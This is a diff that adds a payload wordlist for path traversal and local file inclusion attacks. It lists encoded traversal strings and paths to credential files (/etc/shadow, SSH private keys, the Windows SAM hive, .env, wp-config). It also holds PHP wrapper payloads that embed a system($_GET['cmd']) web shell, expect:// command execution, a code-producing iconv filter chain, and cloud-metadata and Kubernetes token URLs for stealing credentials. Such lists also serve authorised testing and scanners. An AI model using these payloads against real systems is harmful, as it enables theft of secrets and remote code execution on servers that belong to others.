@@ -1,0 +1,252 @@
+# Path Traversal / Directory Traversal Payloads
+# Local File Inclusion (LFI) and path traversal strings
+
+# Basic Path Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+
+# Windows Path Traversal
+..\
+..\..\
+..\..\..\
+..\..\..\..\
+..\..\..\..\..\
+
+# URL Encoded
+..%2f
+..%2f..%2f
+..%2f..%2f..%2f
+..%5c
+..%5c..%5c
+..%5c..%5c..%5c
+
+# Double URL Encoded
+..%252f
+..%252f..%252f
+..%252f..%252f..%252f
+..%255c
+..%255c..%255c
+
+# UTF-8 Encoded
+..%c0%af
+..%c1%9c
+..%c0%2f
+..%c0%5c
+
+# 16-bit Unicode
+..%u002f
+..%u005c
+
+# Overlong UTF-8
+..%c0%af
+..%e0%80%af
+..%c0%2f
+..%c0%5c
+
+# Mixed Encoding
+..%2f..%5c
+..%5c..%2f
+..%252f..%255c
+
+# Null Byte
+..%00/
+../../%00
+../../../%00.jpg
+
+# Dot Variations
+....//
+....\/
+..../\
+....\\
+
+# Filter Bypass
+..;/
+..;//
+http://
+https://
+
+# Absolute Paths - Linux
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/group
+/etc/mysql/my.cnf
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/www/html/index.php
+/home/user/.ssh/id_rsa
+/home/user/.bash_history
+/root/.ssh/id_rsa
+/root/.bash_history
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+
+# Absolute Paths - Windows
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\win.ini
+C:\Windows\system.ini
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\mysql\bin\my.ini
+C:\Program Files\
+C:\Users\Administrator\Desktop\
+C:\Users\Public\Desktop\
+
+# Relative Path with Filename
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# Windows Relative
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+
+# With Null Byte
+../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+
+# Traversal with Common Files
+../../../index.php
+../../../../config.php
+../../../wp-config.php
+../../../../.env
+../../../database.yml
+../../../../settings.py
+
+# Log Poisoning Paths
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail.log
+
+# PHP Wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../../../etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://input
+php://stdin
+php://memory
+php://temp
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+expect://ls
+file:///etc/passwd
+file://localhost/etc/passwd
+
+# Zip Wrapper
+zip://shell.zip%23shell.php
+zip://./shell.zip%23shell.php
+
+# Phar Wrapper
+phar://shell.phar/shell.php
+phar://./shell.phar/shell.php
+
+# Data Wrapper
+data://text/plain,<?php system($_GET['cmd']);?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# Glob Wrapper
+glob:///*
+
+# Input Wrapper
+php://input (with POST data: <?php system($_GET['cmd']);?>)
+
+# Filter Chains (PHP 8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+
+# ASP.NET Path Traversal
+../../web.config
+../../../web.config
+../../../../web.config
+
+# Java Path Traversal
+../../WEB-INF/web.xml
+../../../WEB-INF/web.xml
+../../../../WEB-INF/web.xml
+../../META-INF/context.xml
+../../../META-INF/context.xml
+
+# Node.js Path Traversal
+../../package.json
+../../../package.json
+../../../../package.json
+../../.env
+../../../.env
+
+# Python Path Traversal
+../../settings.py
+../../../settings.py
+../../../../settings.py
+../../config.py
+../../../config.py
+
+# Ruby Path Traversal
+../../config/database.yml
+../../../config/database.yml
+../../../../config/database.yml
+../../Gemfile
+../../../Gemfile
+
+# Cloud Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Container Escape
+/proc/self/cgroup
+/proc/self/mountinfo
+/proc/self/mounts
+/.dockerenv
+/run/secrets/kubernetes.io/serviceaccount/token
+
+# Backup Files
+index.php.bak
+index.php.old
+index.php~
+index.php.swp
+.index.php.swp
+index.php.save
+config.php.bak
+web.config.bak
+.htaccess.bak
+.git/config
+.svn/entries
+.DS_Store
+
+# Source Code Disclosure
+index.php.txt
+index.phps
+index.php.source
+index.php.orig
